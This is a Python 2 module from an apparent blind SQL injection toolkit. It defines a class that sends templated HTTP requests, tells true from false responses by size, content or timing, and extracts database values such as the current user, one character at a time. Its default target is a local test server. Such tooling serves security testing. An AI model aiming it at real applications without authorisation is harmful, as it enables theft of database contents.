from .query import Query
from .requester import *
from .technique import *
from .truth import *

from urllib import quote


class BlindHTTP:
	comparison_attrs = {\
		"content":LooseTextTruth,\
		"text":LooseTextTruth,\
		"size":LooseNumericTruth,\
		"response_time":LooseNumericTruth\
	}
	opposite_comparators = {"<":">",">":"<","=":"!=","!=":"="}

	def __init__(self,\
			url   				= Query('http://127.0.0.1:1337/?${query}'),\
			method 				= 'GET',\
			query 				= Query("foo=${user_query:unimportant}&row_index=${row_index:1}&char_index=${char_index:0}&test_char=${char_val:0}&cmp=${comparator:>}&sleep=${sleep:0}",encoder=quote),\
			comparison_attr 	= "size",\
			acceptable_deviation= None,\
			base_requests 		= 5, *args,**kwargs):
		#setup the queries
		url = url
		query = query

		#build a Requester object. You can pass this any args that you would pass to requests.Request
		requester = HTTPRequester(url = url, method = method, *args, **kwargs)

		#build a Truth class
		mytruth = self.comparison_attrs[comparison_attr](comparison_attr = comparison_attr,acceptable_deviation = acceptable_deviation)

		#the queries default options should evaluate to True in whatever application we are testing. If we flip the comparator it should evauluate to false. 
		#here, we figure out what the opposite comparator is.
		opp_cmp = self.opposite_comparators[query.get_option('comparator')]

		#setup some base values
		for i in xrange(base_requests):
		    mytruth.add_true((requester.make_request(query.render())))
		query.set_option('comparator',opp_cmp)
		for i in xrange(base_requests):
		    mytruth.add_false((requester.make_request(query.render())))

		#build our technique
		self.tech = BlindTechniqueTwo(make_request_func=requester.make_request,query=query,concurrency=1, truth=mytruth)

	def run(self,query='SELECT user()',sleep=0):
		results = self.tech.run( user_query = query ,sleep = sleep)
		return results